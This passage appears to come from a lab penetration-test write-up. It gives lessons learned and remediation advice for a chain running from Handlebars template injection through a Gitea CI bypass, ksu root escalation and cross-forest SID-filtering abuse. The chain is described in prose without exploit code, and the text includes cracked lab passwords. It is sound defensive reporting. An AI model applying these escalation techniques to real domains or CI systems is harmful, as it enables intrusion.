### 6.2 The request encoding is part of the attack surface

A browser form can only send flat strings. If the endpoint also accepts JSON, every field can become an object, array, or number — and applications that branch on type frequently have a dangerous branch nobody tested. Always check whether an endpoint speaks a richer format than its own UI uses.

### 6.3 Error specificity is an oracle

`Invalid CSRF token` proved the JSON body had been parsed, because CSRF validation runs downstream of body parsing. A generic rejection would have taught nothing. Read what an error implies about how far into a pipeline the request reached, not just that it failed.

### 6.4 Ask what the process must know to function

Every service needs credentials at runtime, and they must live somewhere the service account can read. `.env` files, systemd unit definitions, keytabs, configuration directories — these are not exploits, they are the consequence of software needing to work.

### 6.5 Backups outlive deletions

A row removed from the live database survived in a dump. Gaps in sequential primary keys are a signal worth chasing, and backups are typically readable only by root — which is a reason to keep looking _after_ obtaining root, not before.

### 6.6 Privilege escalation often lives between systems rather than inside them

`ksu` was not vulnerable. Active Directory was not vulnerable. The gap was that both treated the string `root` as authoritative for different things, and only one of them restricted who could claim it.

### 6.7 Security controls fail in the direction of their assumptions

SID filtering assumed low RIDs were the dangerous ones. Gitea's approval gate assumed the event object always carried PR context. `SeBackupPrivilege` assumed the caller would ask for backup semantics. Each control worked exactly as designed, and each was bypassed by an input its design never anticipated.

### 6.8 Distinguish the attack from the plumbing

The forest pivot is four commands. Making those four commands run took an encryption-type change, two `/etc/hosts` entries, a `krb5.conf`, and a seven-hour clock offset. Budget for that. When a Kerberos error reads like an authentication failure, verify with `kvno` before assuming the credential is wrong.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※ <br> </div> <!-- PAGE BREAK --> <div style="page-break-after: always;"></div>

## 7. Remediation Recommendations

### 7.1 Handlebars AST injection (CVE-2026-33937)

**What it is:** The `campaign_message` field is passed to Handlebars as a pre-parsed AST when submitted as a JSON object, bypassing the parser and allowing a `NumberLiteral` node's `value` to be written unquoted into generated JavaScript.

**Why it's dangerous:** Remote code execution available to any registered user, with no exploit chain required beyond a crafted JSON body. Registration is open, so the effective barrier is zero.

**Fix:** Upgrade Handlebars to a patched release. Independently, coerce the field to a string before compilation — `Handlebars.compile(String(input))` — and reject non-string values at the API boundary with schema validation. Never accept a template AST from a client; templates belong in source control, not in request bodies. Consider whether users need to supply templates at all: substituting values into a fixed template removes the vulnerability class entirely.

### 7.2 Cleartext credentials in application configuration

**What it is:** `/opt/DarkZero_Campaigns/.env` contains the database password and session signing secret in plaintext, readable by the compromised service account.

**Why it's dangerous:** Converts any code execution into credential theft. The session secret additionally permits forging authentication cookies for arbitrary users, a complete authentication bypass in its own right.

**Fix:** Store secrets in a managed vault (HashiCorp Vault, AWS Secrets Manager, systemd credentials) and inject them at runtime rather than persisting them on disk. Where a file is unavoidable, restrict it to `0400` owned by a user distinct from the one the application runs as, loaded before privilege drop. Rotate both values — they must be considered compromised.

### 7.3 Weak passwords protected only by bcrypt

**What it is:** `Rangers1` and `babygurl13` both appear in `rockyou.txt` and were cracked in under three minutes each despite bcrypt at cost 10.

**Why it's dangerous:** `josh`'s application password was reused for his domain account, converting a web database compromise into SSH access and an inherited Kerberos TGT.

**Fix:** Enforce a password policy that rejects known-breached passwords by checking candidates against a corpus such as Have I Been Pwned at registration. Increase the bcrypt cost factor to 12 or migrate to Argon2id. Most importantly, do not permit domain credentials to be reused for application accounts — federate authentication so the application never holds a password at all.

### 7.4 Gitea Actions fork approval bypass (CVE-2026-22555)

**What it is:** Workflows triggered by `pull_request_review_comment` are dispatched without PR context, so Gitea cannot detect fork origin, skips the maintainer approval gate, and queues the run on the upstream repository's runner.

**Why it's dangerous:** Any user with read access to a repository can execute arbitrary code as the runner service account. The runner here is self-hosted and non-ephemeral, so execution means persistent access to a domain-joined host.

**Fix:** Upgrade Gitea to a patched version. Until then, disable Actions on repositories with self-hosted runners, or restrict runner registration to repositories that accept no external contributions. Architecturally, run CI jobs in ephemeral containers rather than directly on the host, and use a runner account with no domain membership and no privileges beyond what the build requires.

### 7.5 Readable keytab and credential disclosure in a systemd unit

**What it is:** `/etc/systemd/system/gitea-runner.service` names the keytab path and credential cache in a world-readable file, and `/etc/gitea-runner/svc-runner.keytab` is readable by the service account itself.

**Why it's dangerous:** A keytab is equivalent to the account's password and does not expire. Compromise of the service account yields indefinitely renewable domain authentication.

**Fix:** Keytabs should be owned by root with mode `0400`, with `kinit` performed by a root `ExecStartPre` before the service drops privileges — not readable by the account that consumes the resulting ticket. Rotate the `svc-runner` password and regenerate the keytab. Consider whether the runner requires domain membership at all.

### 7.6 Excessive OU delegation permitting arbitrary account creation

**What it is:** `svc-runner`, via the `ServiceHandler` group, holds CREATE_CHILD on `OU=GiteaMigration`, permitting creation of user objects with attacker-chosen names.

**Why it's dangerous:** Combined with 7.7, it produced local root. More broadly, arbitrary account creation enables name-collision attacks against any name-based identity mapping, and creates persistence surviving password rotation.

**Fix:** Remove the delegation — the migration it was created for has evidently completed. Where such delegation is genuinely required, scope it to a specific object class rather than blanket CREATE_CHILD, apply it to a time-limited group, and audit object creation in that OU. Delete the `root` account created during this engagement.

### 7.7 Unrestricted `ksu` name-based authorisation

**What it is:** No `/root/.k5login` exists on SRV01, so `ksu` applies its default rule authorising the principal `root@DARKZERO.EXT` to become local root.

**Why it's dangerous:** Any principal able to create a domain account named `root` obtains uid 0 on every domain-joined Linux host lacking a `.k5login`.

**Fix:** Create `/root/.k5login` on every domain-joined host, listing only the specific administrative principals permitted to escalate, owned by root with mode `0600`. Where `ksu` is not required, remove the `krb5-user` package or the `ksu` binary. Audit all domain-joined Linux hosts for this condition — it is not specific to this server.

### 7.8 SID filtering permitting cross-forest privilege escalation

**What it is:** The forest trust with `darkzero.htb` filters SIDs with RID below 1000 but permits RIDs at or above 1000. `InfrastructureAdministrators` (RID 1603) is nested inside `Backup Operators`, so injecting the high RID conferred the low RID's privilege across the trust.

**Why it's dangerous:** Compromise of the krbtgt key in either forest yields privileged access in the other, defeating the security boundary a forest trust is meant to provide.

**Fix:** Enable full quarantine on the trust (`netdom trust /quarantine:yes`), restricting accepted SIDs to the trusted domain's own primary SID. Independently, do not nest custom groups inside privileged built-in groups — grant `Backup Operators` membership directly to accounts that need it, so no high-RID group launders the privilege. Audit both forests for custom groups nested in `Backup Operators`, `Server Operators`, `Account Operators`, and `Administrators`. Rotate the krbtgt password twice in `darkzero.ext`; the existing key is compromised and all forged tickets remain valid until it is.

### 7.9 Domain controller running unrelated services

**What it is:** Gitea listens on port 3000 of `DC02.darkzero.ext`, the domain controller.

**Why it's dangerous:** Any vulnerability in the co-located application is a domain compromise rather than an application compromise. A domain controller holds the directory database and should present the minimum possible attack surface.

**Fix:** Relocate Gitea to a dedicated member server. Domain controllers should run only domain controller roles.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※ <br> </div> <!-- PAGE BREAK --> <div style="page-break-after: always;"></div>

## References

- Handlebars.js — GHSA-2w6w-674q-4c4q (CVE-2026-33937), AST type confusion
- Gitea 1.25 — CVE-2026-22555, Actions fork approval bypass via `pull_request_review_comment`
- Microsoft — [Security Considerations for Trusts](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321\(v=ws.10\))
- Microsoft — [SID filtering and quarantined domains](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/sid-filtering-quarantining)
- Microsoft — [SeBackupPrivilege and FILE_FLAG_BACKUP_SEMANTICS](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
- MIT Kerberos — `ksu(1)` manual page, `.k5login` authorisation
- Impacket — https://github.com/fortra/impacket
- sshuttle — https://github.com/sshuttle/sshuttle
- Handlebars.js documentation — https://handlebarsjs.com/
- Gitea Actions documentation — https://docs.gitea.com/usage/actions/overview
- OpenLDAP — `ldap.conf(5)`, `SASL_NOCANON` option